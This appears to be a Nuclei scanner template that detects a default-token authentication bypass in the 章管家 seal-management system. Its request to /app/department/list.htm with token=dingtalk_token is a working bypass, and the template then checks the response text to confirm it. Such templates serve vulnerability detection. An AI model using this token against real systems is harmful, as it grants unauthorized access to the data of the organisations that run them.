id: zgj-default-token-bypass

info:
  name: 章管家 Default Token - Bypass
  author: qwtd
  severity: high
  description: 章管家存在默认Token，可绕过登录鉴权操作接口。
  reference:
    - https://forum.butian.net/article/528
  tags: 章管家

http:
  - raw:
      - |
        @timeout: 30s
        GET /app/department/list.htm HTTP/1.1
        Host: {{Hostname}}

      - |
        @timeout: 30s
        GET /app/department/list.htm?token=dingtalk_token HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && contains(body_1, "Token无效")
          - status_code_2 == 200 && contains(body_2, "参数错误")
        condition: and
